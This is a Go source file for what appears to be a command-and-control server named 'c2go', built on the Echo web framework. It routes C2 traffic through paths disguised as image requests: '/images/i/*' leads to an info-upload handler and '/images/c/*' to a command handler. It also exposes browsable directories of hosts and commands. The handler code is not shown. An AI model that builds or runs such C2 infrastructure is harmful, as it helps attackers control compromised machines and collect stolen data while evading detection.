package main

import (
	"context"
	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
	"libs"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"syscall"
)

var (
	server *echo.Echo
	config *utils.ConfigStruct
)

const (
	debug      bool   = true
	staticPath string = "/home/develop/golang/src/ppamo.cl/c2go/webroot/static"
	hostsPath  string = "/home/develop/golang/src/ppamo.cl/c2go/webroot/hosts"
	c2cmdPath  string = "/home/develop/golang/src/ppamo.cl/c2go/webroot/c2cmd"
)

func setupSignalHandler() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		utils.PrintlnDebug(debug, "SIGTERM catched")
		utils.PrintDebug(debug, "Shutting down server")
		err := server.Shutdown(context.Background())
		if err != nil {
			server.Logger.Fatal(err)
		}
	}()
}

func init() {
	utils.PrintDebug(debug, "Init")
	setupSignalHandler()
	go utils.RegisterServer()
	server = echo.New()
	config, _ = utils.GetConfig(true)
}

func terminate() {
	utils.PrintDebug(debug, "Terminating")
}

func main() {
	utils.PrintDebug(debug, "Setting up Webserver")
	server.HideBanner = true
	server.GET("/images/i/*", handleInfoUpload)
	server.GET("/images/c/*", handleC2Cmd)
	server.GET("/static/*", handlerStaticGet, middleware.StaticWithConfig(
		middleware.StaticConfig{
			Root:       staticPath,
			Browse:     true,
			IgnoreBase: true,
		}))
	server.GET("/hosts/*", handlerStaticGet, middleware.StaticWithConfig(
		middleware.StaticConfig{
			Root:       hostsPath,
			Browse:     true,
			IgnoreBase: true,
		}))

	utils.PrintDebug(debug, "Starting Webserver at %s:%d", config.Server.Address, config.Server.Port)
	if err := server.Start(config.Server.Address + ":" + strconv.Itoa(config.Server.Port)); err != nil && err != http.ErrServerClosed {
		server.Logger.Fatal(err)
	}
	defer terminate()
}
